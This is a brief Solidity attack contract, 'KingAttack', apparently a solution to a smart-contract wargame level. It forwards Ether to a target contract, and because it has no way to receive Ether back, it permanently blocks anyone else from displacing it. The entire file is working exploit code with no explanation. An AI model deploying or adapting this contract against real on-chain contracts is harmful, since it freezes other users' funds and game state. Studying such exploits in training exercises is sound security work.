// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract KingAttack {
    address target;
    constructor(address _target) {
        target = _target;
    }

    function attack() external payable {
        (bool sent, ) = payable(target).call{value: msg.value}("");
        require(sent, "Failed to send Ether");
    }
}